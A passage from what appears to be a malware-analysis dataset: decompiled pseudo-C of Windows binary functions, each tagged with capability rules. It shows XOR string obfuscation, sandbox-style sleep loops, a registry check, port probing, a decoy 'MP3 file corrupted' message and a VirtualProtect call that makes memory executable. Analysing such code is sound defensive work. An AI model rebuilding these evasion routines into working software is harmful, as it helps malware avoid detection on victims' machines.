var_bch = 6;\n                iVar7 = 0;\n                do {\n                    puVar1 = iVar7 + lpMem;\n                    iVar9 = iVar7 % 6;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_58h - lpMem];\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    puVar10 = lpMem;\n                } while (iVar7 < 10);\n                do {\n                    iVar2 = *puVar10;\n                    puVar10 = puVar10 + 2;\n                } while (iVar2 != 0);\n                uVar11 = puVar10 - lpMem;\n                puVar10 = lpFileName + -2;\n                do {\n                    piVar5 = puVar10 + 2;\n                    puVar10 = puVar10 + 2;\n                } while (*piVar5 != 0);\n                puVar15 = lpMem;\n                for (uVar8 = uVar11 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar10 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                for (uVar11 = uVar11 & 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar10 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_5ch = 0x3335344c;\n                    var_6ch = 0x33353462;\n                    var_68h._0_1_ = 0x36;\n                    var_7ch = 0x436c4d6a;\n                    var_78h._0_2_ = 0x4453;\n                    var_74h = 0x43424d44;\n                    var_70h._0_1_ = 0x53;\n                    var_b8h = 5;\n                    do {\n                        iVar7 = 0;\n                        uVar4 = (*pcVar14)(8, 9);\n                        lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                        var_44h = &var_5ch - lpString2;\n                        do {\n                            puVar1 = iVar7 + lpString2;\n                            iVar9 = iVar7 % var_b8h;\n                            iVar7 = iVar7 + 1;\n                            *puVar1 = *(&var_6ch + iVar9) ^ puVar1[&var_5ch - lpString2];\n                        } while (iVar7 < 4);\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                        iVar7 = lpString2;\n                        iVar13 = 0;\n                        var_44h = &var_7ch - iVar9;\n                        do {\n                            puVar1 = iVar13 + iVar9;\n                            iVar12 = iVar13 % var_b8h;\n                            iVar13 = iVar13 + 1;\n                            *puVar1 = *(&var_74h + iVar12) ^ puVar1[&var_7ch - iVar9];\n                        } while (iVar13 < 6);\n                        var_d0h = iVar9;\n                        iVar13 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar13 != 0) &&\n                            (iVar13 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar9),  iVar13 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            stack0xffffffc1 = stack0xffffffc1 & 0xffffff | 0x7e000000;\n                            var_38h._1_1_ = 0x4d;\n                            var_38h._2_1_ = 0x20;\n                            stack0xffffffc7 = 0x2c323744;\n                            var_34h._3_1_ = 0x4f;\n                            var_30h = 0x4d125428;\n                            var_2ch = 0x3231441c;\n                            var_28h = 0x54304f39;\n                            var_24h = 0x44214d5b;\n                            var_20h = 0x4f3e3233;\n                            var_1ch = 0x4d665418;\n                            var_18h = 0x3239442a;\n                            var_14h._0_1_ = 0x3d;\n                            var_14h._1_2_ = 0x444f;\n                            var_14h._3_1_ = 0x54;\n                            var_8h = 0x444f4d32;\n                            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x54);\n                            uVar4 = (*pcVar14)(8, 0x51);\n                            pcVar14 = _sym.imp.KERNEL32.dll_HeapAlloc;\n                            var_44h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                            iVar7 = 0;\n                            var_10h = &var_38h - var_44h;\n                            do {\n                                puVar1 = iVar7 + var_44h;\n                                iVar9 = iVar7 % var_b8h;\n                                iVar7 = iVar7 + 1;\n                                *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_38h - var_44h];\n                            } while (iVar7 < 0x28);\n                            var_b4h = 0x52044179;\n                            var_b0h = 0x417c6c1d;\n                            var_ach = 0x6c195215;\n                            var_a8h = 0x52284159;\n                            var_a4h = 0x41576c21;\n                            var_a0h = 0x6c0c5217;\n                            var_9ch = 0x52284154;\n                            var_98h = 0x415d6c39;\n                            var_94h = 0x6c1d5219;\n                            var_90h._0_2_ = 0x4138;\n                            var_84h = 0x52744138;\n                            var_80h._0_2_ = 0x6c6d;\n                            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            var_cch = (*pcVar14)(uVar4);\n                            iVar7 = 0;\n                            var_10h = &var_b4h - var_cch;\n                            do {\n                                puVar1 = iVar7 + var_cch;\n                                iVar9 = iVar7 % var_bch;\n                                iVar7 = iVar7 + 1;\n                                *puVar1 = *(&var_84h + iVar9) ^ puVar1[&var_b4h - var_cch];\n                            } while (iVar7 < 0x26);\n                            var_54h = var_44h;\n                            var_10h = 0;\n                            var_8ch = 0x386f4a56;\n                            var_88h._0_2_ = 0x355a;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_58h = var_cch;\n                            do {\n                                var_40h = 0x381c4a73;\n                                var_3ch._0_1_ = 6;\n                                stack0xffffffc1 = 0x1c4a7335;\n                                var_38h._1_1_ = 0x38;\n                                stack0xffffffc7 = 0x1c4a7335;\n                                var_34h._3_1_ = 0x38;\n                                var_30h = 0x4a233506;\n                                var_2ch = 0x3530381e;\n                                var_28h = 0x38044a35;\n                                var_24h = 0x4a31353f;\n                                var_20h = 0x3532381a;\n                                var_1ch = 0x38414a3a;\n                                var_18h = 0x4a3b352e;\n                                var_14h._0_1_ = 0x1f;\n                                var_14h._1_2_ = 0x5a38;\n                                var_14h._3_1_ = 0x35;\n                                var_38h._2_1_ = var_3ch;\n                                uVar4 = (*pcVar14)(8, 0x61);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                                iVar9 = 0;\n                                var_c8h = &var_40h - iVar7;\n                                do {\n                                    puVar1 = iVar9 + iVar7;\n                                    iVar13 = iVar9 % var_bch;\n                                    iVar9 = iVar9 + 1;\n                                    *puVar1 = *(&var_8ch + iVar13) ^ puVar1[var_c8h];\n                                } while (iVar9 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar7, var_60h, &lpString1, (&var_58h)[var_10h])\n                                ;\n                                iVar9 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(ARG_0);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar9 != -1) {\n                                    fcn.0040de54();\n                                    var_c4h = 1;\n                                }\n                                uVar4 = (*pcVar14)(0, iVar7);\n                                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                                var_10h = var_10h + 1;\n                            } while (var_10h < 2);\n                            uVar4 = (*pcVar14)(0, var_cch);\n                            (*pcVar3)(uVar4);\n                            uVar4 = (*pcVar14)(0, var_44h);\n                            (*pcVar3)(uVar4);\n                            iVar9 = var_d0h;\n                            iVar7 = lpString2;\n                        }\n                        uVar4 = (*pcVar14)(0, iVar9);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        uVar4 = (*pcVar14)(0, iVar7);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar7 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar4 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                piVar5 = var_60h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar4 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(0, piVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (ARG_0 != NULL) {\n            uVar4 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 3945
    },
    "0040c07e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c07e(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    code *pcVar12;\n    int32_t unaff_EDI;\n    uint uStack1412;\n    uint uStack1408;\n    uchar *puStack1404;\n    uchar *puStack1400;\n    uint uStack1396;\n    uchar *puStack1392;\n    int32_t iStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uint uStack1376;\n    int32_t iStack1372;\n    uint uStack1368;\n    uchar *puStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uint uStack1348;\n    code *pcStack1324;\n    uint uStack1320;\n    uint uStack1316;\n    ushort uStack1312;\n    uchar uStack1310;\n    uint uStack1309;\n    uint32_t uStack1305;\n    ushort uStack1301;\n    uint uStack1296;\n    uint uStack1292;\n    int32_t iStack1288;\n    uint uStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uchar uStack1248;\n    uint uStack1247;\n    uint uStack1243;\n    uint uStack1239;\n    uint uStack1235;\n    uint uStack1231;\n    uint uStack1227;\n    uint uStack1223;\n    uint uStack1219;\n    uint uStack1215;\n    uint uStack1211;\n    uint uStack1207;\n    uchar uStack1203;\n    ushort uStack1202;\n    uint uStack1176;\n    uint uStack1172;\n    int32_t iStack1164;\n    uint uStack1160;\n    int16_t iStack1148;\n    uchar auStack1146 [2];\n    uint uStack1144;\n    uint uStack1140;\n    uchar auStack1136 [12];\n    uchar auStack1124 [4];\n    uchar auStack1120 [52];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1140 = 0x200;\n    uStack1312 = 0xb2c;\n    puVar5 = &stack0xfffffbf8;\n    for (iVar8 = 0x400; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1309 = 0x7416291f;\n    puVar5 = &stack0xfffffb90;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1305 = 0x2015595c;\n    puVar5 = &stack0xfffffbd4;\n    for (iVar8 = 0x24; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    uStack1348 = 0xe;\n    uStack1352 = 8;\n    uStack1144 = 5;\n    uStack1310 = 5;\n    uStack1301 = 0x4716;\n    uStack1264 = 0x71776e47;\n    uStack1260 = CONCAT22(uStack1260._2_2_, 0x7a4c);\n    uStack1356 = 0x40c107;\n    uStack1356 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1360 = 0x40c10e;\n    iStack1164 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack1160 = 0;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iStack1164;\n        iVar10 = iVar8 % 6;\n        iVar8 = iVar8 + 1;\n        *puVar1 = (&stack0xfffffb04)[iVar10] ^ puVar1[&stack0xfffffad4 + -iStack1164];\n    } while (iVar8 < 0xd);\n    uStack1360 = 0x15;\n    puStack1364 = 0x8;\n    pcStack1324 = 0x37403208;\n    uStack1320 = 0x21263036;\n    uStack1316 = 0x372e2a51;\n    uStack1312 = 0x323b;\n    uStack1310 = 0x59;\n    uStack1309 = 0x20223930;\n    uStack1305 = uStack1305 & 0xffffff00 | 0x57;\n    uStack1284 = 0x7934574f;\n    uStack1280 = CONCAT22(uStack1280._2_2_, 0x4457);\n    uStack1368 = 0x40c18e;\n    uStack1368 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iStack1372 = 0x40c195;\n    iStack1372 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar8 = 0;\n    iStack1288 = iStack1372;\n    do {\n        puVar1 = iVar8 + iStack1372;\n        iVar10 = iVar8 % unaff_EDI;\n        iVar8 = iVar8 + 1;\n        *puVar1 = (&stack0xfffffaf0)[iVar10] ^ puVar1[&stack0xfffffac8 + -iStack1372];\n    } while (iVar8 < 0x14);\n    uStack1376 = uStack1176;\n    uStack1380 = 0x40c1cf;\n    uStack1380 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack1384 = 0x40c1d6;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1309 = uStack1309 & 0xff | uVar4 << 8;\n    uStack1305 = uStack1305 & 0xffffff00 | uVar4 >> 0x18;\n    uStack1384 = &stack0xfffffb6c;\n    uStack1172 = 0x40;\n    iStack1388 = 0x40c1f3;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    iStack1388 = 0xbd;\n    puStack1392 = 0x8;\n    uStack1296 = 0x7103473a;\n    uStack1292 = 0x47165403;\n    iStack1288 = 0x54107115;\n    uStack1284 = 0x71074700;\n    uStack1280 = 0x4736542d;\n    uStack1276 = 0x54227127;\n    uStack1272 = 0x71304731;\n    uStack1268 = 0x47225438;\n    uStack1264 = 0x54387136;\n    uStack1260 = 0x712c473d;\n    uStack1256 = 0x4721542d;\n    uStack1252 = 0x5402711b;\n    uStack1248 = 6;\n    uStack1247 = 0x1c710747;\n    uStack1243 = 0x21472e54;\n    uStack1239 = 0x1c541471;\n    uStack1235 = 0x3711647;\n    uStack1231 = 0xe471354;\n    uStack1227 = 0x542171;\n    uStack1223 = 0x12710d47;\n    uStack1219 = 0x11471754;\n    uStack1215 = 0x1d540271;\n    uStack1211 = 0x2d711047;\n    uStack1207 = 0x62474254;\n    uStack1203 = 0x71;\n    iStack1372 = 0x71624772;\n    uStack1368 = CONCAT22(uStack1368._2_2_, 0x5471);\n    uStack1396 = 0x40c308;\n    uStack1396 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1400 = 0x40c30f;\n    uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar8 = 0;\n    uStack1211 = uStack1211 & 0xffffff | uVar4 << 0x18;\n    uStack1207 = uStack1207 & 0xff000000 | uVar4 >> 8;\n    do {\n        puVar1 = iVar8 + uVar4;\n        iVar10 = iVar8 % iStack1372;\n        iVar8 = iVar8 + 1;\n        *puVar1 = (&stack0xfffffa98)[iVar10] ^ puVar1[&stack0xfffffae4 + -uVar4];\n    } while (iVar8 < 0x5e);\n    if (pcStack1324 == NULL) {\n        puStack1400 = &stack0xfffffba0;\n        puStack1404 = 0x40c35f;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        puStack1400 = &stack0xfffffba0;\n        puStack1404 = 0x40c34f;\n        (*pcStack1324)();\n    }\n    puStack1404 = 0x15;\n    uStack1408 = 8;\n    uStack1368 = 0x5220730c;\n    puStack1364 = 0x733a4d23;\n    uStack1360 = CONCAT22(uStack1360._2_2_, 0x5245);\n    iStack1388 = 0x52457354;\n    uStack1384 = CONCAT22(uStack1384._2_2_, 0x4d4c);\n    uStack1412 = 0x40c391;\n    uStack1412 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar8 = 0;\n    puStack1392 = puVar5;\n    do {\n        puVar1 = puVar5 + iVar8;\n        iVar10 = iVar8 % iStack1388;\n        iVar8 = iVar8 + 1;\n        *puVar1 = (&stack0xfffffa88)[iVar10] ^ puVar1[&stack0xfffffa9c + -puVar5];\n    } while (iVar8 < 10);\n    uVar6 = CONCAT31(uStack1223, uStack1227._3_1_);\n    iVar8 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(reloc.WS2_32.dll_bind, uVar6, &stack0xfffffb34);\n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 == 0) {\n        puStack1392 = 0x413c5761;\n        iStack1388 = 0x4e343120;\n        uStack1384 = 0x57424f24;\n        uStack1380 = 0x3120413d;\n        uStack1376 = 0x4f0f4e25;\n        iStack1372 = 0x41235750;\n        uStack1368 = 0x4e04312a;\n        puStack1364 = 0x57434f35;\n        uStack1360 = 0x31214127;\n        uStack1356 = 0x4f414e30;\n        puStack1400 = 0x414e5731;\n        uStack1396 = CONCAT31(uStack1396._1_3_, 0x4f);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        iVar10 = 0;\n        puStack1364 = &stack0xfffffa84 + -iVar8;\n        do {\n            puVar1 = iVar10 + iVar8;\n            iVar11 = iVar10 % CONCAT31(uStack1235, uStack1239._3_1_);\n            iVar10 = iVar10 + 1;\n            *puVar1 = (&stack0xfffffa7c)[iVar11] ^ puVar1[&stack0xfffffa84 + -iVar8];\n        } while (iVar10 < 0x28);\n        puVar5 = &stack0xfffffb30;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1252, iVar8, 0, 0, &stack0xfffffb9c, puVar5);\n        pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        piVar9 = &stack0xfffffb84;\n        do {\n            iVar2 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar2 != uStack1264);\n        if (piVar9 - &stack0xfffffb86 >> 1 != 0) {\n            while (iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, puVar5),  iVar10 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1276);\n        uVar6 = (*pcVar12)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        uVar6 = CONCAT31(uStack1235, uStack1239._3_1_);\n    }\n    if (CONCAT22(uStack1202, CONCAT11(uStack1203, uStack1207._3_1_)) == 0) {\n        uVar4 = CONCAT31(uStack1207, uStack1211._3_1_);\n        while (uVar4 < 2100000000) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            puVar5 = puStack1404;\n            if (CONCAT22(uStack1202, CONCAT11(uStack1203, uStack1207._3_1_)) != 0) break;\n            uVar4 = CONCAT31(uStack1207, uStack1211._3_1_);\n        }\n    }\n    uVar7 = (*pcVar12)(0, puVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar6 = (*pcVar12)(0, uVar6);\n    (*pcVar3)(uVar6);\n    uVar6 = (*pcVar12)(0, uStack1368);\n    (*pcVar3)(uVar6);\n    uVar6 = (*pcVar12)(0, uStack1268);\n    (*pcVar3)(uVar6);\n    return;\n}\n",
        "token_count": 3500
    },
    "0040c5b3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.0040c5b3(void)\n\n{\n    uint8_t *puVar1;\n    ushort uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar9;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40c5d4;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar3 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar3 != 0xffffffff) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar4 + 2000U & 0xffff;\n        uVar3 = 0;\n        if (uVar7 < 64000) {\n            puStack476 = 0x4b765846;\n            uVar9 = 0x58686855;\n            do {\n                uVar7 = uVar9;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                iVar8 = 0;\n                do {\n                    puVar1 = iVar8 + iVar4;\n                    iVar6 = iVar8 % 5;\n                    iVar8 = iVar8 + 1;\n                    *puVar1 = (&stack0xfffffe18)[iVar6] ^ puVar1[&stack0xfffffe20 + -iVar4];\n                } while (iVar8 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar4);\n                uVar2 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar9 = CONCAT22(uVar2, 2);\n                iVar8 = (*_sym.imp.WS2_32.dll_bind)(0x657a, &stack0xfffffe30, 0x10);\n                if (iVar8 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x657a);\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    break;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar7 = uVar7 + 1;\n                uVar3 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar3 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 701
    },
    "0040c6f5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c6f5(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar10 = &var_24h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_ch = 5;\n    var_30h = 0x5082e38;\n    var_2ch = 0x36324a04;\n    var_28h = CONCAT22(var_28h._2_2_, 0x6900);\n    var_1ch = 0x696c5a56;\n    var_18h._0_2_ = 0x6468;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = 0;\n    do {\n        var_8h = 6;\n        puVar1 = iVar6 + lpModuleName;\n        iVar7 = iVar6 % 6;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_1ch + iVar7) ^ puVar1[&var_30h - lpModuleName];\n    } while (iVar6 < 10);\n    var_34h._0_2_ = 0x121c;\n    var_34h._2_1_ = 0x1b;\n    var_34h._3_1_ = 5;\n    var_30h = 0x216231d;\n    var_2ch = 0x140d1732;\n    var_28h = 0x4e407514;\n    var_1ch = 0x4677664e;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x72);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar6 = lpModuleName;\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar7;\n        iVar8 = iVar9 % var_ch;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_1ch + iVar8) ^ puVar1[&var_34h - iVar7];\n    } while (iVar9 < 0x10);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    cVar3 = fcn.0040e1a9();\n    if (cVar3 != '\\0') {\n        var_4h = (*pcVar5)(0, var_20h, var_24h);\n    }\n    fcn.00407fc3();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar2)(0, iVar6);\n    (*pcVar5)(uVar4);\n    return var_4h;\n}\n",
        "token_count": 949
    },
    "0040c8c3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c8c3(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_c4h = 0x208;\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"MP3 file corrupted\");\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40c063, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    iVar5 = fcn.0040d4b4();\n    if (iVar5 == 0) {\n        fcn.0040c07e();\n        fcn.00409ae2();\n        while (iVar5 = fcn.00409a78(),  iVar5 != 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QGFF__, 0x184, 0x40, &var_b4h);\n    if (iVar5 != 0) {\n        fcn.00407c2c();\n        (*pcVar2)(str.QGFF__, 0x184, var_b4h, &var_b4h);\n    }\n    puVar8 = 0x41cd60;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00405eae();\n    puVar10 = &var_58h;\n    for (iVar5 = 0x1c; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &var_c0h;\n    for (iVar5 = 0xc; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar8 = 0x41cd4c;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar10 = &var_34ch;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_c4h);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_34h = 6;\n    if (iVar5 != 0) {\n        var_24h = 0x4b3e3365;\n        var_20h = 0x33624f12;\n        var_1ch = 0x4f164b23;\n        var_18h = 0x4b28337d;\n        var_14h._0_2_ = 0x4f57;\n        var_8h = 0x4b6d3330;\n        var_4h._0_2_ = 0x4f57;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar9 = 0;\n        var_38h = &var_24h - iVar5;\n        do {\n            puVar1 = iVar9 + iVar5;\n            iVar7 = iVar9 % var_34h;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_8h + iVar7) 